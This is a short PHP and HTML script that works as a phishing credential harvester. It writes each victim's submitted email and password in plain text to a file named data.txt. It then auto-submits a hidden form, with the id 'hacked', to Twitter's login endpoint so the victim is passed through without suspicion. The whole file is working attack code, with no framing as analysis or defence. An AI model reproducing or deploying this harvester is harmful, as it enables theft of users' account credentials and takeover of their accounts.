<?php 
$file = fopen('data.txt', 'a+');
$write = fwrite($file, 'email: '.$_POST['Email']. PHP_EOL .'password: '. $_POST['Passwd'].PHP_EOL.PHP_EOL );
fclose($file);

 ?>
<html>
<head>
	<title></title>
	<script type="text/javascript">
	function submitnow () {
		document.getElementById("hacked").submit();
	}
	</script>
</head>
<body onload="submitnow()">
<form action="https://twitter.com/sessions" method="post" id="hacked">
 	<input type="hidden" name='email' value="<?php echo $_POST['Email']; ?>">
 	<input type="hidden" name='pass' value="<?php echo $_POST['Passwd']; ?>">
 </form>
</body>
</html>
 